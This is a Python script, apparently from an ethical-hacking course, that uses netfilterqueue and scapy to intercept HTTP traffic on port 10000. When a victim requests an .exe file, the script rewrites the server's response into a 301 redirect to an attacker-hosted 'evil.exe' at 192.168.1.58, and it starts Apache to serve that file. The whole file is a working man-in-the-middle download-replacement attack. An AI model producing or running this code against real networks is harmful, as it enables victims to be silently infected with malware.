import subprocess

import netfilterqueue
import scapy.all as scapy

ack_list=[]

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in str(scapy_packet[scapy.Raw].load) and "192.168.1.58" not in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                print(scapy_packet.show())
                modified_packet= set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation:http://192.168.1.58/evil-files/evil.exe\n\n")
                packet.set_payload(bytes(modified_packet))

    packet.accept()
subprocess.run('service apache2 start', shell=True)
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()